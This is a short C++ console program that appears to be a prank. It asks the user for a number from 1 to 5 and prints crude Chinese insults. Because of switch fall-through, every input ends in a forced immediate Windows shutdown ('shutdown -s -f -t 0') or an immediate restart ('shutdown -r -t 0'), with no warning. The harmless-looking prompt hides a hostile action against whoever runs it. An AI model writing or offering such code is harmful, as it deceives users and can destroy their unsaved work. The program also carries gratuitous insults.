#include <iostream>
using namespace std;
int main(){
	int a;
	cout<<"请输入一个1到5的整数："<<endl;
	cin>>a;
	switch(a){
		case 1:cout<<"我是你爹！";
		case 2:cout<<"傻逼！";
		case 3:cout<<"要我怎么说你哪？";
		case 4:cout<<"还不去睡觉？"; system("shutdown -s -f -t 0");break;
		default:system("shutdown -r -t 0");
			break;
		}
		
	return 0;
}
